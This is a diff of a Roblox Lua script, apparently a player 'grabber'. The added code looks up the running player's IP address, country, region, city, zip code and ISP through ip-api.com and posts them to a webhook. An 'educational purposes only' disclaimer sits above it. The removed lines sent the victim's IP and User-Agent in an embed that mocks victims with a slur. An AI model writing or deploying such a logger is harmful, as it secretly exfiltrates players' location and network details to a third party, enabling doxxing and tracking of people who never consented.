@@ -10,31 +10,26 @@ function sendnotif(STitle, SDescription, SDuration)
 })
 end
 
-local stuff = request({Url = "https://httpbin.org/get", Method = "GET"}).Body;
-local decoded = game:GetService('HttpService'):JSONDecode(stuff)
+--I DO NOT CONDONE THE MALICIOUS USE OF THIS SCRIPT. THIS IS PURELY FOR EDUCATIONAL PURPOSES AND SHOULD NOT BE USED IN ANY CONTEXT OTHER THAN THAT. PLEASE STAY SAFE AND BE CLEAR OF SCRIPTS THAT MAKE CONTAIN RELATED OR SIMILAR CONTENT.
+local player_name = game:GetService("Players").LocalPlayer.Name
+local webhook_url = ""
 
-local data = {
-    ['embeds'] = ({
-        ["author"] = {
-            ['name'] = game.Players.LocalPlayer.Name,
-            ['icon_url'] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=100&y=100&username="..game.Players.LocalPlayer.Name
+local ip_info = request({
+    Url = "http://ip-api.com/json",
+    Method = "GET"
+})
+local ipinfo_table = game:GetService("HttpService"):JSONDecode(ip_info.Body)
+local dataMessage = string.format("%s\n```User: %s\nIP: %s\nCountry: %s\nCountry Code: %s\nRegion: %s\nRegion Name: %s\nCity: %s\nZipcode: %s\nISP: %s\nOrg: %s```", game:GetService("Players").LocalPlayer.Name, ipinfo_table.query, ipinfo_table.country, ipinfo_table.countryCode, ipinfo_table.region, ipinfo_table.regionName, ipinfo_table.city, ipinfo_table.zip, ipinfo_table.isp, ipinfo_table.org)
+request(
+    {
+        Url = webhook_url,
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
         },
-        ['description'] = "just caught another one, these bitchasses are so retarded",
-        ["color"] = tonumber(0xFFFB76),
-        ['fields'] = {
-            {
-                ['name'] = " ! IP ADDRESS ! : ",
-                ['value'] = decoded['origin'],
-                ['inline'] = true
-            },
-            {
-                ['name'] = " ! LOCAL DEVICE ! :",
-                ['value'] = decoded.headers['User-Agent'],
-                ['inline'] = true
-            }
-        }
-    })
-}
+        Body = game:GetService("HttpService"):JSONEncode({["content"] = dataMessage})
+    }
+)
 sendnotif('kevin priv', 'kevin black pwet', 3)
 
 
